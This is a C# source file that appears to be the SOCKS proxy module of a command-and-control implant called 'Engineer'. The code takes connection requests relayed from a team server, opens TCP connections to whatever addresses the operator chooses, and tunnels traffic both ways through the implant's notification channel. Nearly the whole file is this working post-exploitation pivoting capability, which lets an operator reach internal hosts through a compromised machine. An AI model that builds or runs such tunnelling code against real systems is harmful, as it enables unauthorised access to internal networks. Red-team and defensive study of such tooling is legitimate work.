using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using DynamicEngLoading;
using Engineer.Functions;


namespace Engineer.Commands
{
    internal class socks : EngineerCommand
    {
        public static SynchronizedCollection<string> SocksClients = new();
        public static readonly  ConcurrentDictionary<string, ConcurrentQueue<byte[]>> SocksClientsData = new();
        public static int TrafficSize = 12800000;

        public override string Name => "socks";
        internal static CancellationTokenSource _tokenSource = new();
        public override async Task Execute(EngineerTask task)
        {
            task.Arguments.TryGetValue("/port", out var port);
            //if task.arguments holds key /stop return saying the socks proxy won /port was stopped
            if (task.Arguments.ContainsKey("/stop"))
            {
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"Socks proxy on port {port} stopped", task, EngTaskStatus.Complete,TaskResponseType.String);
                _tokenSource.Cancel();
                return;
            }

            ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"socks started on team server at port {port}", task, EngTaskStatus.Running,TaskResponseType.String);
        }
    }
    internal class socksConnect 
    {
        public string Name => "socksConnect";
        public static async Task Execute(AssetNotification sockNotif)
        {
            try
            {
                //try to get the values for /Address and /Port from the task.arguments dictionary convert the address to an IpAddress object and the port to an int
                sockNotif.NotificationData.TryGetValue("/Address", out var address_data);
                sockNotif.NotificationData.TryGetValue("/Port", out var port_data);
                sockNotif.NotificationData.TryGetValue("/Client", out var client_data);
                string address = address_data.JsonDeserialize<string>();
                int port = port_data.JsonDeserialize<int>();
                string client = client_data.JsonDeserialize<string>();
                socks.SocksClients.Add(client);
                socks.SocksClientsData.TryAdd(client, new ConcurrentQueue<byte[]>());
                //Console.WriteLine($"Connecting to {address}:{port}");

                await ConnectSocks(address, port, client,sockNotif.AssetId);
               // ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"Connecting to {address}:{port}" + $"\n{client}", task, EngTaskStatus.Complete,TaskResponseType.String);
            }
            
            catch(Exception e)
            {
                //Console.WriteLine(e.Message);
                //Console.WriteLine(e.StackTrace);
               // ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error with socks connect", task, EngTaskStatus.Failed,TaskResponseType.String);
            }
        }
        
        private static async Task ConnectSocks(string address, int port, string client,string assetId)
        {
            var ipAddress = IPAddress.Parse(address);
            var portInt = port;
            // connect to destination
            var destination = new TcpClient();
            destination.ReceiveBufferSize = socks.TrafficSize;
            destination.SendBufferSize = socks.TrafficSize;
            destination.NoDelay = true;
            try
            {               
                await destination.ConnectAsync(ipAddress, portInt);
                Dictionary<string, byte[]> connectnotifdata = new()
                {
                    {"/client", client.JsonSerialize() }
                };
                await Tasking.CreateOutboundNotif(assetId,"socksConnect", connectnotifdata, false);
                while (!socks._tokenSource.IsCancellationRequested)
                {
                    // send to destination
                    if (!socks.SocksClientsData[client].IsEmpty)
                    {
                        socks.SocksClientsData[client].TryDequeue(out var data);
                        await destination.SendData(data, socks._tokenSource.Token);
                    }
                    // read from destination
                    if (destination.DataAvailable())
                    {
                        var resp = await destination.ReceiveData(socks._tokenSource.Token);

                        Dictionary<string, byte[]> recvnotifdata = new()
                        {
                            {"/client", client.JsonSerialize() },
                            {"/data",resp },
                        };
                        await Tasking.CreateOutboundNotif(assetId, "socksReceive", recvnotifdata, false);
                    }
                    // rip cpu
                    await Task.Delay(1);
                }
            }
            catch (Exception e)
            {
                //Console.WriteLine(e.Message);
                //Console.WriteLine(e.StackTrace);
            }
        }
    }
    
    internal class SocksSend
    {
        public string Name => "SocksSend";
        public static async Task Execute(AssetNotification notif)
        {
            notif.NotificationData.TryGetValue("/client", out var clientId_array);
            notif.NotificationData.TryGetValue("/data", out var req);
            string client = clientId_array.JsonDeserialize<string>();
            socks.SocksClientsData[client].Enqueue(req);
        }
    }
    

    internal static class Extensions
    {
        public static async Task<byte[]> ReceiveData(this TcpClient client, CancellationToken token)
        {
            using var ms = new MemoryStream();
            var ns = client.GetStream();
            int read;
            do
            {
                var buf = new byte[socks.TrafficSize];
                read = await ns.ReadAsync(buf, 0, buf.Length, token);
                if (read == 0)
                    break;

                await ms.WriteAsync(buf, 0, read, token);
            } while (read >= socks.TrafficSize);

            return ms.ToArray();
        }


        public static async Task SendData(this TcpClient client, byte[] data, CancellationToken token)
        {
            
            var ns = client.GetStream();
            await ns.WriteAsync(data, 0, data.Length, token);
        }

        public static bool DataAvailable(this TcpClient client)
        {
            var ns = client.GetStream();
            return ns.DataAvailable;
        }

        public static void Clear(this MemoryStream stream)
        {
            var buffer = stream.GetBuffer();
            Array.Clear(buffer, 0, buffer.Length);
            stream.Position = 0;
            stream.SetLength(0);
        }
    }
}
